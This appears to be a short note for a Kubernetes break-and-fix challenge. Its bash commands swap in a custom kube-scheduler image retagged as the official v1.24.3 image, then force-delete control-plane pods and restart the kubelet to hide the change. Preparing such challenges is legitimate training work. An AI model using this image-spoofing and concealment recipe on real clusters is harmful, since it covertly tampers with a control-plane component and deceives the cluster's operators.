# Idea

modify name of scheduler, then hide everything.

```bash
ctr --namespace=k8s.io images pull ghcr.io/jkroepke/klustered/kube-scheduler:latest
ctr --namespace=k8s.io images tag --force ghcr.io/jkroepke/klustered/kube-scheduler:latest k8s.gcr.io/kube-scheduler:v1.24.3
ctr --namespace=k8s.io images rm ghcr.io/jkroepke/klustered/kube-scheduler:latest
sleep 2
crictl -r unix:///run/containerd/containerd.sock rmp -f $(crictl -r unix:///run/containerd/containerd.sock pods | grep kube-scheduler | cut -d' ' -f1)
kubectl delete pods -l component=kube-scheduler -n kube-system --grace-period=0
```


# Hiding

```bash
kubectl delete pods -l 'component in (kube-scheduler, kube-apiserver, kube-controller-manager)' -n kube-system --force --grace-period=0
systemctl restart kubelet
```
